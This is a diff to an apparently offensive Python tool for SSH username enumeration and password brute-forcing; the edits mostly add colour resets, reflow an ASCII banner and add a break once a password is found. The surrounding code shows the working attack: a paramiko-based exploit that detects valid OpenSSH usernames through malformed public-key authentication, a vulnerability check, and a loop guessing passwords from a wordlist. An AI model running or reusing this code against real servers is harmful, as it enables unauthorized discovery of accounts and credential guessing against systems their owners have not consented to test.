@@ -68,14 +68,14 @@ def exploit(hostname, username, port, validuser = ""):
         try:
             transport.start_client()
         except paramiko.ssh_exception.SSHException:
-            print("supposed exception")
+            print("supposed exception"+ Style.RESET_ALL)
             # server was likely flooded, retry up to 3 times
             transport.close()
             if tried < 4:
                 tried += 1
                 return checkUsername(username, tried)
             else:
-                print('[-] Failed to negotiate SSH transport')
+                print('[-] Failed to negotiate SSH transport'+ Style.RESET_ALL)
         try:
             transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
         except BadUsername:
@@ -85,7 +85,7 @@ def exploit(hostname, username, port, validuser = ""):
                 return (username, True)
                 
         #Successful auth(?)
-        raise Exception("There was an error. Is this the correct version of OpenSSH?")
+        raise Exception("There was an error. Is this the correct version of OpenSSH?"+ Style.RESET_ALL)
     
     # function to test target system using the randomly generated usernames
     def checkVulnerable():
@@ -101,13 +101,13 @@ def exploit(hostname, username, port, validuser = ""):
         sock.connect((hostname, port))
         sock.close()
     except socket.error:
-        print('[-] Connecting to host failed. Please check the specified host and port.')
+        print('[-] Connecting to host failed. Please check the specified host and port.'+ Style.RESET_ALL)
         sys.exit(1)
 
     # first we run the function to check if host is vulnerable to this CVE
     if not checkVulnerable():
         # most probably the target host is either patched or running a version not affected by this CVE
-        print("[-] Target host most probably is not vulnerable or already patched, exiting...")
+        print("[-] Target host most probably is not vulnerable or already patched, exiting..."+ Style.RESET_ALL)
         sys.exit(0)
     elif username:
         result = checkUsername(username)
@@ -162,33 +162,33 @@ try:
 
     print(Fore.CYAN+"""\
         
-                )     (    )                      SSH User or Password Enmeration  
-                 )     )  ( 
-                  )    )   (         ,adPPYba, 88       88  ,adPPYba,  8b,dPPYba,   ,adPPYba,  
-               _.(--'('''--)._      I8[    "" 88       88 a8"     "8a 88P'    "8a a8P_____88      
-              /, _..-----).._,\      `"Y8ba,  88       88 8b       d8 88       d8 8PP"""""""
-             |  `'''-----'''`  |    aa    ]8I "8a,   ,a88 "8a,   ,a8" 88b,   ,a8" "8b,   ,aa 
-              \               /     `"YbbdP"'  `"YbbdP'Y8  `"YbbdP"'  88`YbbdP"'   `"Ybbd8"' 
-               '.           .'                                        88               
-                 '--.....--'                                          88 
-                                                             V1.0.5
-                                                ASCII Art Credit ascii.co.uk
+      SSH User or Password Enmeration  
+
+,adPPYba, 88       88  ,adPPYba,  8b,dPPYba,   ,adPPYba,  
+I8[    "" 88       88 a8"     "8a 88P'    "8a a8P_____88      
+ `"Y8ba,  88       88 8b       d8 88       d8 8PP"""""""
+aa    ]8I "8a,   ,a88 "8a,   ,a8" 88b,   ,a8" "8b,   ,aa 
+`"YbbdP"'  `"YbbdP'Y8  `"YbbdP"'  88`YbbdP"'   `"Ybbd8"' 
+                                  88           
+                                  88 
+                    V1.0.5
+          ASCII Art Credit ascii.co.uk
                                             """)
     
     if args.userfile:
         if os.path.exists(args.userfile) == False:
-            print(Fore.RED + "[-] Username Filepath: " +args.userfile  +" Does Not Exist. Exiting Now...")
+            print(Fore.RED + "[-] Username Filepath: " +args.userfile  +" Does Not Exist. Exiting Now..."+ Style.RESET_ALL)
             sys.exit(3)
         else:
-            lineuser = [line.strip("\n") for line in open(args.userfile)]
+            lineuser = [line.strip("\n") for line in open(args.userfile,'r')]
     elif args.username:
         lineuser = [args.username]
     if args.passfile:
         if os.path.exists(args.passfile) == False:
-            print(Fore.RED + "[-] Password Filepath: " +args.passfile + " Does Not Exist. Exiting Now...")
+            print(Fore.RED + "[-] Password Filepath: " +args.passfile + " Does Not Exist. Exiting Now..."+ Style.RESET_ALL)
             sys.exit(3)
         else:
-            linepassword = [line.strip("\n") for line in open(args.passfile)]
+            linepassword = [line.strip("\n") for line in open(args.passfile,'r')]
     elif args.password:
         linepassword = [args.password]
 
@@ -200,6 +200,7 @@ try:
                     response = ssh_connect(args.hostname, args.port, validuser, password)                
                     if response == 0:
                         print(Fore.GREEN + "[+] User: %s [+] Pass Found: %s" % (validuser, password)+ Style.RESET_ALL)
+                        break
                     elif response == 1 and args.suppress == False:
                         print(Fore.RED + "[/] User: %s [/] Pass: %s => Login Incorrect!!! <=" % (validuser, password)+ Style.RESET_ALL)  
                     elif response == 2:
@@ -209,5 +210,5 @@ try:
                     print (ex)
                     pass            
 except KeyboardInterrupt:
-    print("\n\n[-] User Requested An Interupt. Exiting Now...")
+    print("\n\n[-] User Requested An Interupt. Exiting Now..."+ Style.RESET_ALL)
     sys.exit(4)
